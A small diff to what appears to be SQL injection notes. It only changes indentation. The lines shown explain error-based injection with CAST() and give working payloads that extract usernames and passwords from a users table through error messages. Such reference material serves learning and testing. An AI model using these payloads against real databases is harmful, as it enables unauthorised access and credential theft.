@@ -57,7 +57,7 @@
 -	Using CAST() function to convert data types when conditional responses is prevented.
 -	eg: CAST((SELECT example_column FROM example_table) AS int)
 -	Example of working Error-Based SQLI that returns the data through error message:
-  -	' AND 1=CAST((SELECT username FROM users LIMIT 1)AS INT)—
+-	' AND 1=CAST((SELECT username FROM users LIMIT 1)AS INT)—
   -	' AND 1=CAST((SELECT password FROM users LIMIT 1)AS INT)—
 
 
